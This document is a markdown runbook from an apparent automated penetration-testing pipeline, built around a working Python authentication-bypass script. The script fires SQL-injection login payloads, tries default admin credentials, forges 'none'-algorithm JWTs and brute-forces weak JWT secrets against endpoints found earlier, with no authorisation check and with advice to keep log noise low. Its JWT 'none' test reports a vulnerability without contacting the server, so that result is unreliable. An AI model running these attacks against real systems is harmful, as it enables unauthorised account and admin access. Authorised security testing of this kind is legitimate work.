# 08 - Authentication Bypass Testing

## Purpose
Detect flaws in authentication mechanisms including JWT vulnerabilities, session management issues, and SQL injection in login forms.

## Inputs
- `04_fingerprint.json` - Authentication surfaces, framework information
- `02_live_hosts.json` - Login endpoints, session handling

## Testing Strategy

### Phase 1: JWT Vulnerabilities
Test JSON Web Token implementations for:
- **Algorithm confusion**: RS256 → HS256 downgrade
- **None algorithm**: Unsigned tokens accepted
- **Weak secrets**: Brute-forceable signing keys
- **Missing signature validation**

### Phase 2: Session Management
Test session handling for:
- Predictable session IDs
- Session fixation vulnerabilities
- Missing HttpOnly/Secure flags
- Session timeout issues

### Phase 3: SQL Injection in Authentication
Test login forms with SQL injection payloads:
- Classic: `' OR '1'='1`
- Commenting: `admin' --`
- Boolean-based: `' OR 1=1#`

### Phase 4: Default Credentials
Test known admin panels with common credentials:
- admin/admin, admin/password
- root/root, administrator/password

## Commands

### Setup
```bash
RUN_DIR="runs/$(basename $(pwd))-$(date +%Y%m%d-%H%M%S)"

# Install JWT tools
pip3 install pyjwt
command -v jwt_tool >/dev/null 2>&1 || echo "Optional: Install jwt_tool from GitHub"
```

### Authentication Bypass Testing Script
```python
#!/usr/bin/env python3
"""
Authentication Bypass Testing
"""
import json
import jwt
import requests
import time
from datetime import datetime
from pathlib import Path
import sys
import re

# SQL injection payloads for authentication bypass
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
]

# Default credentials to test
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("admin", "admin123"),
    ("admin", "Admin123"),
    ("user", "user"),
    ("test", "test"),
]

def load_authentication_surfaces(run_dir):
    """Load authentication endpoints from fingerprinting phase"""
    fingerprint_file = Path(run_dir) / "04_fingerprint.json"
    if not fingerprint_file.exists():
        print(f"[!] {fingerprint_file} not found. Run discovery phase first.")
        sys.exit(1)

    with open(fingerprint_file) as f:
        data = json.load(f)

    auth_surfaces = data.get('authentication_surfaces', [])
    print(f"[*] Loaded {len(auth_surfaces)} authentication surfaces")
    return auth_surfaces

def extract_jwt_from_response(response):
    """Extract JWT token from response (headers or body)"""
    # Check Authorization header
    auth_header = response.headers.get('Authorization', '')
    if 'Bearer ' in auth_header:
        return auth_header.split('Bearer ')[1]

    # Check Set-Cookie
    cookies = response.headers.get('Set-Cookie', '')
    jwt_pattern = r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+'
    match = re.search(jwt_pattern, cookies)
    if match:
        return match.group(0)

    # Check response body
    try:
        data = response.json()
        if isinstance(data, dict):
            for key in ['token', 'access_token', 'jwt', 'auth_token']:
                if key in data:
                    return data[key]
    except:
        pass

    # Check plain text response
    match = re.search(jwt_pattern, response.text)
    if match:
        return match.group(0)

    return None

def test_jwt_vulnerabilities(token):
    """Test JWT token for common vulnerabilities"""
    vulnerabilities = []

    try:
        # Decode without verification to inspect
        unverified = jwt.decode(token, options={"verify_signature": False})
        header = jwt.get_unverified_header(token)

        print(f"[*] JWT Algorithm: {header.get('alg', 'unknown')}")
        print(f"[*] JWT Claims: {list(unverified.keys())}")

        # Test 1: None algorithm
        try:
            none_token = jwt.encode(unverified, key='', algorithm='none')
            vulnerabilities.append({
                'type': 'JWT None Algorithm',
                'payload': none_token,
                'description': 'Token accepts "none" algorithm (no signature)'
            })
            print(f"[+] JWT None algorithm vulnerability detected")
        except:
            pass

        # Test 2: Algorithm confusion (RS256 → HS256)
        if header.get('alg') == 'RS256':
            # This would require the public key to test properly
            vulnerabilities.append({
                'type': 'JWT Algorithm Confusion (Potential)',
                'description': 'RS256 in use - test HS256 downgrade with public key',
                'note': 'Requires public key to exploit'
            })
            print(f"[*] RS256 detected - potential algorithm confusion vulnerability")

        # Test 3: Weak secret (common secrets)
        if header.get('alg') in ['HS256', 'HS384', 'HS512']:
            weak_secrets = ['secret', 'password', '123456', 'admin', 'jwt']
            for secret in weak_secrets:
                try:
                    jwt.decode(token, secret, algorithms=[header.get('alg')])
                    vulnerabilities.append({
                        'type': 'JWT Weak Secret',
                        'secret': secret,
                        'description': f'Token signed with weak secret: {secret}'
                    })
                    print(f"[+] JWT weak secret found: {secret}")
                    break
                except jwt.InvalidSignatureError:
                    continue
                except:
                    pass

    except Exception as e:
        print(f"[!] Error analyzing JWT: {e}")

    return vulnerabilities

def test_sql_injection_login(login_url, rate_limit=1.0):
    """Test login form for SQL injection"""
    vulnerabilities = []

    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    print(f"[*] Testing SQL injection on: {login_url}")

    for payload in SQL_INJECTION_PAYLOADS[:5]:  # Limit to first 5 payloads
        data = {
            'username': payload,
            'password': 'anything'
        }

        try:
            response = requests.post(login_url, data=data, headers=headers, timeout=10, allow_redirects=False)

            # Check for successful bypass
            if response.status_code in [200, 302]:
                # Look for success indicators
                success_indicators = [
                    'dashboard', 'welcome', 'logout', 'profile',
                    'successfully logged in', 'authentication successful'
                ]

                response_text = response.text.lower()
                redirect_location = response.headers.get('Location', '').lower()

                if any(indicator in response_text or indicator in redirect_location for indicator in success_indicators):
                    vulnerabilities.append({
                        'type': 'SQL Injection in Authentication',
                        'payload': payload,
                        'url': login_url,
                        'status_code': response.status_code,
                        'evidence': 'Login bypass successful with SQL injection payload'
                    })
                    print(f"[+] SQL injection bypass found with payload: {payload}")
                    break  # Found vulnerability, stop testing

                # Check for JWT token in response
                jwt_token = extract_jwt_from_response(response)
                if jwt_token:
                    vulnerabilities.append({
                        'type': 'SQL Injection in Authentication',
                        'payload': payload,
                        'url': login_url,
                        'evidence': 'Received authentication token with SQL injection payload',
                        'token': jwt_token[:50] + '...'  # Truncate for safety
                    })
                    print(f"[+] SQL injection: Received auth token with payload: {payload}")
                    break

        except requests.exceptions.RequestException as e:
            print(f"[!] Error testing payload {payload}: {e}")
            continue

        time.sleep(rate_limit)

    return vulnerabilities

def test_default_credentials(login_url, rate_limit=2.0):
    """Test login form with default credentials"""
    vulnerabilities = []

    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    print(f"[*] Testing default credentials on: {login_url}")

    for username, password in DEFAULT_CREDENTIALS[:5]:  # Limit to first 5
        data = {
            'username': username,
            'password': password
        }

        try:
            response = requests.post(login_url, data=data, headers=headers, timeout=10, allow_redirects=False)

            # Check for successful login
            if response.status_code in [200, 302]:
                success_indicators = ['dashboard', 'welcome', 'logout']
                response_text = response.text.lower()
                redirect_location = response.headers.get('Location', '').lower()

                if any(indicator in response_text or indicator in redirect_location for indicator in success_indicators):
                    vulnerabilities.append({
                        'type': 'Default Credentials',
                        'username': username,
                        'password': password,
                        'url': login_url,
                        'evidence': 'Successfully authenticated with default credentials'
                    })
                    print(f"[+] Default credentials found: {username}/{password}")
                    break

        except requests.exceptions.RequestException as e:
            print(f"[!] Error testing {username}/{password}: {e}")
            continue

        time.sleep(rate_limit)

    return vulnerabilities

def test_session_management(auth_surface):
    """Test session management security"""
    vulnerabilities = []

    url = auth_surface['url']
    headers = {'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'}

    try:
        response = requests.get(url, headers=headers, timeout=10)

        # Check Set-Cookie headers
        set_cookie = response.headers.get('Set-Cookie', '')

        if set_cookie:
            # Check for missing HttpOnly flag
            if 'HttpOnly' not in set_cookie:
                vulnerabilities.append({
                    'type': 'Missing HttpOnly Flag',
                    'url': url,
                    'evidence': 'Session cookie missing HttpOnly flag (XSS can steal session)',
                    'severity': 'medium'
                })
                print(f"[*] Missing HttpOnly flag on session cookie")

            # Check for missing Secure flag
            if 'Secure' not in set_cookie and url.startswith('https'):
                vulnerabilities.append({
                    'type': 'Missing Secure Flag',
                    'url': url,
                    'evidence': 'Session cookie missing Secure flag on HTTPS site',
                    'severity': 'medium'
                })
                print(f"[*] Missing Secure flag on session cookie")

            # Check for SameSite attribute
            if 'SameSite' not in set_cookie:
                vulnerabilities.append({
                    'type': 'Missing SameSite Attribute',
                    'url': url,
                    'evidence': 'Session cookie missing SameSite attribute (CSRF risk)',
                    'severity': 'low'
                })
                print(f"[*] Missing SameSite attribute on session cookie")

    except requests.exceptions.RequestException as e:
        print(f"[!] Error testing session management: {e}")

    return vulnerabilities

def create_vulnerability_report(finding, run_dir):
    """Create standardized vulnerability report"""

    vuln_type = finding.get('type', 'Authentication Bypass')

    # Determine severity
    if vuln_type == 'SQL Injection in Authentication':
        severity = 'critical'
        cvss_score = 9.8
        impact = 'Complete authentication bypass, potential database compromise'
    elif vuln_type == 'Default Credentials':
        severity = 'critical'
        cvss_score = 9.1
        impact = 'Unauthorized administrative access'
    elif vuln_type.startswith('JWT'):
        severity = 'high'
        cvss_score = 8.1
        impact = 'Token forgery, session hijacking'
    else:
        severity = finding.get('severity', 'medium')
        cvss_score = 6.5
        impact = 'Session security weakness'

    vuln = {
        'id': f"VULN-AUTH-{datetime.now().strftime('%Y%m%d%H%M%S')}",
        'type': vuln_type,
        'severity': severity,
        'endpoint': finding.get('url', ''),
        'discovered_at': datetime.utcnow().isoformat() + 'Z',
        'proof_of_concept': {
            'method': finding.get('type', ''),
            'payload': finding.get('payload', ''),
            'evidence': finding.get('evidence', ''),
        },
        'cvss_score': cvss_score,
        'references': [
            'https://owasp.org/www-project-top-ten/',
            'https://cwe.mitre.org/data/definitions/287.html'
        ]
    }

    # Add type-specific remediation
    if vuln_type == 'SQL Injection in Authentication':
        vuln['remediation'] = 'Use parameterized queries. Implement input validation. Never concatenate user input in SQL.'
    elif vuln_type == 'Default Credentials':
        vuln['remediation'] = 'Force password change on first login. Remove default accounts.'
        vuln['proof_of_concept']['credentials'] = f"{finding.get('username')}/{finding.get('password')}"
    elif 'JWT' in vuln_type:
        vuln['remediation'] = 'Use strong signing algorithms (RS256). Validate algorithm. Use strong secrets (>256 bits).'
    else:
        vuln['remediation'] = 'Implement secure session management: HttpOnly, Secure, SameSite flags.'

    return vuln

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 08_auth_bypass.py <run_directory>")
        sys.exit(1)

    run_dir = sys.argv[1]
    print(f"[*] Authentication Bypass Testing - Run Directory: {run_dir}")

    # Load authentication surfaces
    auth_surfaces = load_authentication_surfaces(run_dir)

    if not auth_surfaces:
        print("[*] No authentication surfaces found. Skipping auth bypass testing.")
        sys.exit(0)

    # Test each surface
    all_vulnerabilities = []
    tested_count = 0

    for surface in auth_surfaces[:10]:  # Limit to first 10
        url = surface.get('url', '')
        auth_type = surface.get('type', 'unknown')

        print(f"\n[*] Testing authentication surface: {url}")
        print(f"[*] Type: {auth_type}")

        vulnerabilities = []

        # Test SQL injection if it's a form-based login
        if auth_type in ['form', 'unknown']:
            sql_vulns = test_sql_injection_login(url, rate_limit=1.0)
            vulnerabilities.extend(sql_vulns)

            # Test default credentials
            default_creds_vulns = test_default_credentials(url, rate_limit=2.0)
            vulnerabilities.extend(default_creds_vulns)

        # Test session management
        session_vulns = test_session_management(surface)
        vulnerabilities.extend(session_vulns)

        tested_count += 1

        # Create reports for findings
        for vuln_finding in vulnerabilities:
            vuln = create_vulnerability_report(vuln_finding, run_dir)
            all_vulnerabilities.append(vuln)
            print(f"[+] VULNERABILITY: {vuln['type']} - {vuln['severity'].upper()}")

    # Update findings.json
    findings_file = Path(run_dir) / "findings.json"

    if findings_file.exists():
        with open(findings_file) as f:
            findings = json.load(f)
    else:
        schema_path = Path(__file__).parent / "findings_schema.json"
        with open(schema_path) as f:
            findings = json.load(f)
        findings['target'] = Path(run_dir).name.split('-')[0]
        findings['run_directory'] = run_dir
        findings['timestamp'] = datetime.utcnow().isoformat() + 'Z'

    # Append vulnerabilities
    findings['vulnerabilities'].extend(all_vulnerabilities)
    findings['total_vulnerabilities'] = len(findings['vulnerabilities'])
    findings['tested_endpoints'] += tested_count

    # Update severity breakdown
    for vuln in all_vulnerabilities:
        findings['severity_breakdown'][vuln['severity']] += 1

    # Save findings
    with open(findings_file, 'w') as f:
        json.dump(findings, f, indent=2)

    print(f"\n[*] Testing complete. Found {len(all_vulnerabilities)} authentication vulnerabilities.")
    print(f"[*] Results saved to {findings_file}")

if __name__ == '__main__':
    main()
```

## Expected Output

### Vulnerable - SQL Injection
```json
{
  "type": "SQL Injection in Authentication",
  "severity": "critical",
  "proof_of_concept": {
    "payload": "' OR '1'='1",
    "evidence": "Login bypass successful with SQL injection payload"
  },
  "cvss_score": 9.8
}
```

### Vulnerable - JWT None Algorithm
```json
{
  "type": "JWT None Algorithm",
  "severity": "high",
  "proof_of_concept": {
    "method": "JWT algorithm manipulation",
    "payload": "eyJ...none token...",
    "evidence": "Token accepts 'none' algorithm"
  },
  "cvss_score": 8.1
}
```

## Safety Notes

### Rate Limiting
- **SQL injection**: 1s between payloads (5 payloads max)
- **Default credentials**: 2s between attempts (prevents account lockout)
- **Session testing**: Single request per surface

### Detection Risk
- **HIGH** - Authentication testing is heavily monitored
- Limit payloads to minimize log noise
- Stop after first successful bypass

## Execution Time
**Estimated**: 10-15 minutes
- SQL injection: 5 payloads × 1s = 5s per endpoint
- Default creds: 5 attempts × 2s = 10s per endpoint
- Session testing: 1s per endpoint
- 10 endpoints × 15s = ~2.5 minutes + overhead

## Next Step
After auth bypass testing:
- If critical bypass found: **Report immediately**
- Proceed to **09_misconfig.md** (security configuration testing)
